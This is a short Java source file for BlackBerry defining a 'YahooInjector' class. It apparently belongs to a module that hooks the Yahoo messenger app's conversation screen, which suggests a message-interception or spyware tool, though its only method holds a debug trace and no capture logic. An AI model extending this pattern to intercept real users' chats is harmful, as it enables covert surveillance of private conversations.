package blackberry.injection.injectors;

import net.rim.device.api.ui.Screen;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class YahooInjector extends AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("YahooInjector", DebugLevel.VERBOSE);
    //#endif
    
    public String getAppName() {
        return "Yahoo";
    }

    public String getCodName() {
        return "net_rim_bb_qm_yahoo";
    }

    public String[] getWantedScreen() {

        return new String[] { "ConversationScreen" };
    }

    public void playOnScreen(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen");
        //#endif
    }

}
